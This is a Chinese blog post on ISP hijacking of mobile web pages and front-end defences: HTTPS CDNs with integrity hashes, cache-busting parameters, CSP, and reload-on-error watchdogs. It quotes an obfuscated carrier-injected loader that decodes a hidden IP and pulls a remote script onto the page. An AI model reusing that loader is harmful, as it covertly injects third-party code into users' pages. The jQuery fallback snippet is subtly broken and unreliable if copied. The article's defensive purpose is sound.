---
layout: post
title: "网络劫持"
date: 2018-12-25 11:14:54
categories: JavaScript
tags: js http dns
excerpt: 解决运营商的网络劫持问题
---

- content
  {:toc}
  国内 H5 页面的网络劫持愈演愈烈，所以前端得想办法解决它。

## 常见的劫持方法

### HTTP 劫持

简单的说就是在你的网页上`<head>`/`<body>`，插入一段标签、一段 js 等等方法。

### DNS 劫持

DNS 劫持，主要就是让你的域名跳转到运营商指定的域名去，比如你访问`www.baidu.com`,结果给你跳到 12345 网站。

还有一种就是跳转到运营的网页，然后在`iframe`中在嵌套你想去的网站，这样广告就能随意增加了

### JS 劫持

js 劫持本质上还是 DNS 劫持，但是它只对 js 起效，基本上是随机把你的一个 js 文件进行替换，然后在使用 js 吧你原本的 js 加载回来。

一般运营替换的 js 形式如下：

```js
!(function(e, t, n, o, r, i, a, c) {
  (c = (function(e, t, n) {
    for (t = e % 256, n = 3; 0 < n; n--)
      t = ((e = Math.floor(e / 256)) % 256) + "." + t;
    return t;
  })(2095620274)),
    (a = function(e) {
      (r = t.createElement(n)),
        (i = t.getElementsByTagName(n)[0]),
        (r.src = "//" + e),
        i.parentNode.insertBefore(r, i);
    })(
      o + (0 < o.indexOf("?") ? "&" : "?") + "_t" + new Date().getTime() + "=0i"
    ),
    a(c + "/v1/a/?u=3236477");
})(
  window,
  document,
  "script",
  "我的域名/static/help/js/jquery18min.js?t=23432423234"
);
```

## 当下的劫持问题现状

现在主要出现的就是让人防不胜防的`js劫持`，别的劫持特征太明显，或者太容易解决，已经基本被运营商淘汰，所以主要的就是`js劫持`问题。

js 劫持，运气好只是多一点广告，运气不好的时候，甚至会导致网站本身的 js 报错，依赖缺失，无法执行渲染导致白屏等等问题。

所以解决`js劫持`问题，是最重要的一环。

## 解决方法

最简单的解决方法就是启用 HTTPS。

当然如果能启用 HTTPS 的话，我也就不会写这篇文章了。

### 为什么不能启用 HTTPS

- 1、证书问题
  - 不过一般这不是问题，免费的证书也多的是
- 2、部署 https 问题
  - 这也不是问题，运维会搞定的，就算没运维，自己按照文章几个小时总能搞定的
- 3、HTTPS 中不允许 http
  - 这是最主要的问题，很多时候都是使用的第三方接口、资源，甚至需要 iframe 接入别的公司的的业务页面。只要涉及到的，都无法改。
- 4、HTTPS 导致的流量飙升问题
  - 服务器流量、cdn 流量都是需要花钱的，之前尝试升级到 https 之后，流量翻了 3 倍，流量费用有点吃不消（阿里云太黑！）

### http 下解决 js 劫持问题

#### 依赖文件使用 HTTPS

常用的依赖库，比如 `jssdk`、`jquery`等等库，可以使用 HTTPS 协议的，防止劫持，导致依赖出现问题。比如`https://www.bootcdn.cn/`、`https://cdn.baomitu.com/`

如果防止第三方 cdn 服务出现问题，可以在加入 js 使用本地 js 以防万一，以 jquery 为例

```html
<head>
  <script crossorigin="anonymous" integrity="sha384-nvAa0+6Qg9clwYCGGPpDQLVpLNn0fRaROjHqs13t4Ggj3Ez50XnGQqc/r8MhnRDZ" src="https://lib.baomitu.com/jquery/1.12.4/jquery.min.js"></script>
  <script>
    if(!jQuery){ // 如果下载没成功，就下载本地的jq
      document.write('<script src="./js/jquery.js"></script>')
    }
  </script>
</head>
```

#### 普通 js 加参数

总结大部分的 js 都是加了参数就放行，所以我们提前加上参数，这样就减少被劫持的风险

```html
<script src="https://lib.baomitu.com/jquery/1.12.4/jquery.min.js?v=1234567"></script>
```

#### CSP

csp 全名是 Content Security Policy ，简单的理解就是白名单，只要是在白名单中的 js 才允许下载，不是白名单中的域名的 js，浏览器直接拦截不会下载。

但是这会造成一个问题，那就是,被劫持的 js 没有被重新加载回来。

为了解决这个问题，需要分情况讨论了。

如果是普通的 js，可以采用`看门狗`技术
```html
<script>
var t = setTimeout(function(){
  location.reload(true);
},1e4)
</script>
```

```js
// 被劫持的js
clearTimeout(t)
```


如果是类似 vue、react 那样需要按需加载,并且使用了webpack打包的js，则可以采用捕获错误信息来解决

```js
(function() {
  var windowOnError;
  var consoleOnError;
  var isFunction = function(value) {
    return Object.prototype.toString.call(value) == "[object Function]";
  };
  if (isFunction(window.onerror)) {
    windowOnError = window.onerror;
  }
  if (isFunction(console.error)) {
    consoleOnError = console.error;
  }
  window.onerror = function(message, source, lineNo, colNo, error) {
    var msg = message;
    var stack = !!error && !!error.stack;
    var statckInfo = (stack && error.stack.toString()) || "";
    if (/webpackJsonp/gi.test(msg + statckInfo)) {
      setTimeout(function() {
        location.reload(true);
      }, 3000);
    }
    if (isFunction(windowOnError)) {
      windowOnError.call(window, message, source, lineNo, colNo, error);
    }
  };
  console.error = function(t) {
    var msg = t.message;
    var reg = /Loading chunk/gi;
    if (reg.test(msg)) {
      setTimeout(function() {
        location.reload(true);
      }, 3000);
    }
    if (isFunction(consoleOnError)) {
      consoleOnError.call(window, t);
    }
  };
})();
```

### 总结
被劫持问题，还是防不胜防，在http下只能是尽人事，效果具体如何还是看实际情况而定了。祝愿大家都能早日升级到HTTPS